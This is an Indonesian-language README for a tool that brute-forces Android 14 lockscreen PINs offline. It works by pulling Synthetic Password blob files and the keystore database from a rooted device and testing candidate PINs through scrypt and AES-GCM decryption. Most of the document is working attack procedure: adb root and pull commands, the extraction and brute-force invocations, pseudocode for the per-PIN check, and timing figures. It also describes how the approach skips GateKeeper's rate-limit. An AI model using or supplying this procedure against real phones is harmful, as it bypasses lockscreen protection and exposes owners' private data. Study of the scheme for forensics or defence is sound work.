# Android 14 PIN Brute-Force via SP Blob Decryption

Tool untuk brute-force PIN Android 14 secara **offline** dengan mendekripsi Synthetic Password Blob (`.spblob`). Tanpa throttle, tanpa rate-limit.

---

## Arsitektur Keamanan Android 14

```
PIN "019283"
    │
    ▼ scrypt(N=2048, r=8, p=2, salt dari .pwd)
stretchedLskf (32B) ──► GateKeeper (rate-limit check, tidak digunakan utk brute)
    │
    │  + secdiscardable_hash (SHA512 dari .secdis, 16KB)
    ▼
protectorSecret (96B)
    │
    ▼ SHA512(pad128("application-id") || protectorSecret)
inner AES key (32B)
    │
    ├── decrypt outer layer spblob (Keystore key dari persistent.sqlite)
    │
    ▼
    decrypt inner layer ──► ✅ Authentication tag match = PIN benar
                           ❌ Tag mismatch = PIN salah
```

> **Perbedaan dengan Android lama:** Tidak ada `SHA1(salt+PIN)` hash. Verifikasi PIN melalui **keberhasilan dekripsi** spblob, bukan pencocokan hash.

---

## File Penting di Device

| File | Lokasi | Fungsi |
|---|---|---|
| `*.pwd` | `/data/system_de/0/spblob/` | Salt + scrypt parameters |
| `*.spblob` | `/data/system_de/0/spblob/` | Target brute-force (encrypted) |
| `*.secdis` | `/data/system_de/0/spblob/` | Secdiscardable (16KB random) |
| `persistent.sqlite` | `/data/misc/keystore/` | Keystore AES key (outer layer) |

> `*` = Protector ID (16-char hex), bisa dilihat dari `dumpsys lock_settings`

---

## Langkah 1: Siapkan Emulator

```bash
# Cek emulator yang tersedia
adb devices

# Root emulator dengan adbd (tanpa Magisk)
adb root

# Verifikasi
adb shell whoami
# Output harus: root
```

---

## Langkah 2: Investigasi Credential

```bash
# Cek tipe dan status lockscreen
adb shell dumpsys lock_settings | grep -E "CredentialType|disabled|protector ID"

# Output contoh:
#   CredentialType: PIN
#   LSKF-based SP protector ID: 127c801dd428770a
```

> **Catatan:** File `.key` lama (`password.key`, `gesture.key`) sudah **tidak ada** di Android 7+. Digantikan oleh GateKeeper + SyntheticPasswordManager.

---

## Langkah 3: Ekstrak Parameter

### 3a. Mode Otomatis (ADB)

```bash
python3 extract_params.py --adb --output params.json
```

Script akan otomatis:
1. Menemukan Protector ID dari `dumpsys lock_settings`
2. Pull `.pwd`, `.spblob`, `.secdis` dari `/data/system_de/0/spblob/`
3. Pull `persistent.sqlite` dari `/data/misc/keystore/`
4. Parse salt, scrypt params, secdiscardable hash, Keystore key
5. Output `params.json`

### 3b. Mode Manual

```bash
# Pull file dari device
adb pull /data/system_de/0/spblob/<PROTECTOR_ID>.pwd   spblob_data/
adb pull /data/system_de/0/spblob/<PROTECTOR_ID>.spblob spblob_data/
adb pull /data/system_de/0/spblob/<PROTECTOR_ID>.secdis spblob_data/
adb pull /data/misc/keystore/persistent.sqlite           spblob_data/

# Ekstrak parameter
python3 extract_params.py \
  --pwd       spblob_data/<PROTECTOR_ID>.pwd \
  --spblob    spblob_data/<PROTECTOR_ID>.spblob \
  --secdis    spblob_data/<PROTECTOR_ID>.secdis \
  --keystore-db spblob_data/persistent.sqlite \
  --protector-id <PROTECTOR_ID> \
  --output params.json
```

**Output `params.json`:**
```json
{
  "protector_id": "127c801dd428770a",
  "salt_hex": "eb398080a092f8e0bd9b170c8b0cb2d9",
  "scrypt_n": 2048,
  "scrypt_r": 8,
  "scrypt_p": 2,
  "sec_hash_hex": "6ab6ae44f0755ebb...",
  "keystore_key_hex": "d57749b72e4c6ab...",
  "outer_iv_hex": "3a68190ea310456ef77879c0",
  "outer_ct_tag_hex": "8b363dce76409b712882bef7..."
}
```

---

## Langkah 4: Jalankan Brute-Force

### Basic (4-6 digit PIN)
```bash
python3 gpu_brute.py --params params.json -L 4 -M 6 -w 8
```

### 6-digit only (lebih cepat)
```bash
python3 gpu_brute.py --params params.json -L 6 -M 6 -w 8
```

### Resume dari checkpoint (kalau mati di tengah)
```bash
python3 gpu_brute.py --params params.json -L 6 -M 6 --resume
```

### Mulai dari PIN tertentu
```bash
python3 gpu_brute.py --params params.json -L 6 -M 6 --start 500000
```

**Output saat PIN ditemukan:**
```
[*] Brute-forcing 6-digit PINs (1,000,000 combinations)...

============================================================
 ✅ PIN FOUND: 019283
    Checked: 19,283 PINs
    Time:    96s (1.6m)
============================================================
```

> Script **otomatis berhenti** begitu PIN ditemukan.

---

## Performa

| PIN Length | Combinations | Workers | Waktu (est.) |
|---|---|---|---|
| 4-digit | 10,000 | 8 | ~1 menit |
| 5-digit | 100,000 | 8 | ~10 menit |
| 6-digit | 1,000,000 | 8 | ~15-20 menit |

> **Rate:** ~100-120 PIN/detik (CPU multi-core, scrypt N=2048).  
> Checkpoint otomatis setiap 10,000 PIN — aman kalau proses mati di tengah.

---

## Cara Kerja (Detail Teknis)

### Algoritma per PIN Candidate

```python
# 1. Derivasi dari PIN
stretched = scrypt(PIN, salt, N=2048, r=8, p=2, dklen=32)

# 2. Gabung dengan secdiscardable hash
protector_secret = stretched + secdiscardable_hash  # 32B + 64B = 96B

# 3. Derivasi inner key
inner_key = SHA512(pad128("application-id") || protector_secret)[:32]

# 4. Decrypt outer layer (sekali saja, pre-computed)
intermediate = AES256_GCM_decrypt(outer_ct_tag, keystore_key)

# 5. Decrypt inner layer (per PIN candidate)
try:
    plaintext = AES256_GCM_decrypt(intermediate, inner_key)
    # ✅ Tag match = PIN benar!
except InvalidTag:
    # ❌ Tag mismatch = PIN salah, lanjut
```

### 4 Komponen yang Diekstrak

| Komponen | Sumber | Fungsi |
|---|---|---|
| **Salt** (16B) | `.pwd` file (parse PasswordData) | Input scrypt |
| **scrypt N,r,p** | `.pwd` file (log values: N=2^11, r=2^3, p=2^1) | Parameter scrypt |
| **Secdiscardable hash** (64B) | `.secdis` file (16KB random) | Tambahan entropy untuk protector secret |
| **Keystore key** (32B) | `persistent.sqlite` (keyentry → blobentry) | Decrypt outer layer spblob |

### Mengapa Tidak Ada Hash?

Android 14 menggunakan paradigma **"proof by decryption"** — membuktikan tahu PIN dengan berhasil mendekripsi synthetic password. Tidak seperti Android lama yang menyimpan `SHA1(salt + PIN)`.

**Komponen yang dibutuhkan untuk brute-force offline:**
- Salt (dari `.pwd`)
- Secdiscardable (dari `.secdis`, 16KB)
- Keystore key (dari `persistent.sqlite`)
- Encrypted SP blob (dari `.spblob`)

> Tanpa **salah satu** dari keempat komponen di atas, brute-force offline **tidak mungkin** dilakukan.

---

## Struktur Project

```
pin-unlocker/
├── extract_params.py       # Auto-ekstrak parameter dari 4 file + Keystore DB
├── gpu_brute.py            # Brute-force engine (checkpoint/resume/range)
├── README.md               # Dokumentasi ini
└── spblob_data/            # Sample files dari device
    ├── pwd.bin              #   Salt + scrypt params
    ├── spblob.bin           #   Target brute-force (encrypted)
    ├── secdis.bin           #   Secdiscardable (16KB)
    └── persistent.sqlite    #   Keystore database
```

## Requirements

```bash
pip install cryptography
```

- Python 3.8+
- ADB (untuk ekstraksi dari device)
- Device/emulator Android 14 rooted

## License

MIT
